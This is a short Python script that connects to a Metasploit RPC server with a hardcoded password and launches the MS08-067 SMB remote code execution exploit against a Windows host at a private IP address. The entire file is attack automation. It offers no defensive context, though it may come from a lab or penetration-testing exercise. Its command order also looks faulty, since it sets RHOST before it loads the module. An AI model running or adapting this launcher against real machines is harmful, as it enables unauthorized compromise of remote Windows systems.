
from metasploit.msfrpc import MsfRpcClient as mrc
from metasploit.msfconsole import MsfRpcConsole as mco
import time

class msfconsole():
        def __init__(self):
            
            argc = {"port":55552,"ssl":False}
            conn= mrc("abc123", **argc)
            print conn    
            
            self.clint = mco(conn)
            
        
        def testExp(self,RHOST, exploit):
            self.clint.execute("set RHOST "+RHOST)
            self.clint.execute("use "+exploit)
            if exploit[:3]=='exp':
                self.clint.execute("exploit")
            else : self.clint.execute("run")
            time.sleep(2)
            self.clint.execute("background")
            
        #def wait(self):
            

def main():
    msf = msfconsole()
    msf.testExp("192.168.1.14","exploit/windows/smb/ms08_067_netapi")
    #msf.testExp("192.168.1.14","exploit/windows/smb/ms08_067_netapi")
    
if __name__ == "__main__":
    main()